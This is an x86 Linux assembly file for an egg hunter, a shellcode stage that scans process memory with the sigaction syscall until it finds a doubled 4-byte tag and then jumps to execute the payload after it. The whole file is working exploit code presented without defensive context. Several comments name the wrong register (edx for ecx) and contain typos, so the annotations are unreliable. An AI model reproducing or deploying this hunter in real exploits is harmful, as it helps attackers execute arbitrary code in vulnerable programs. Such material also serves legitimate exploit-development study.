global _start

section .text
_start:

    ;cld
    xor ecx, ecx
    ;mul ecx                 ; zero out eax and edx

align_page:
    or cx, 0xfff            ; add 4095

next_addr:
    inc ecx                 ; edx = 4096
    push byte +0x43          ; push 67 sigaction sys-call
    pop eax
    int 0x80                ; execute sigaction

    cmp al, 0xf2            ; comapare al with -14 (0xfffffff2) EFAULT
    jz align_page           

    mov eax, 0x50905091     ; using scasd to comapre eax and edi, set eax = to egg tag
    mov edi, ecx            ; validate address by moving edx into edi
    
    scasd                   ; increment by 0x4 and compare eax and edi, looking for first egg tag
    jnz next_addr

    scasd                   ; inc 0x4 and second compare looking for second egg tag
    jnz next_addr

    jmp edi                 ; execute shellcode if both egg tags are found
